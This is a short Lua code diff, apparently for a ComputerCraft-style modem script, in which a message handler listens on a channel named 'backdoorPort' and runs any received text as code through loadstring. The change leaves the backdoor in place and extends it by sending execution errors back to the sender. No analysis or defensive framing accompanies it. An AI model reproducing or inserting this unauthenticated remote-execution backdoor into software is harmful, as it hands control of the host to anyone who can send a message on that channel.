@@ -104,13 +104,16 @@ function Check(event, side, channel, replyChannel, message, distance)
     print(event, side, channel, replyChannel, message, distance)
     if channel == backdoorPort then
         modem.transmit(port, backdoorPort, "Code Sent!")
-        pcall(function()
+        local s, e = pcall(function()
 ---@diagnostic disable-next-line: deprecated
             local code = loadstring(message);
             if type(code) == "function" then
                 code()
             end
         end)
+        if not s then
+            modem.transmit(port, backdoorPort, e)
+        end
     elseif channel == port and message == "get" then
         modem.transmit(port, backdoorPort, id)
     end
